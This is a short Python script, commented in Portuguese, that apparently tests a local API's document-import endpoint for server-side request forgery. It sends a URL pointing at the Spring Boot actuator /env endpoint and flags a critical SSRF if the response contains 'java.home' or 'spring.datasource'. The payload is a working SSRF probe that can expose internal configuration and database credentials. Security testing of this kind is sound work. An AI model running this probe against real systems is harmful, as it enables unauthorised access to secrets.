import requests
import json

# Passo 1: Criação do dicionário JSON
def criar_dicionario_json():
    """
    Cria um dicionário JSON com uma chave 'url_importacao' apontando para 'http://localhost:8080/actuator/env'.
    """
    dicionario_json = {
        'url_importacao': 'http://localhost:8080/actuator/env'
    }
    return dicionario_json

# Passo 2: Enviar o JSON via POST
def enviar_json(dicionario_json):
    """
    Envia o dicionário JSON via POST para 'http://localhost:8080/api/documents/importar'.
    """
    url = 'http://localhost:8080/api/documents/importar'
    resposta = requests.post(url, json=dicionario_json)
    return resposta

# Passo 3: Verificar a resposta HTTP
def verificar_resposta(resposta):
    """
    Verifica se o texto da resposta contém chaves sensíveis e imprime um alerta se necessário.
    """
    texto_resposta = resposta.text
    chaves_sensiveis = ['java.home', 'spring.datasource']
    for chave in chaves_sensiveis:
        if chave in texto_resposta:
            print('Vulnerabilidade SSRF Crítica: A API está a refletir recursos internos da infraestrutura')
            break

# Chamada das funções
dicionario_json = criar_dicionario_json()
resposta = enviar_json(dicionario_json)
verificar_resposta(resposta)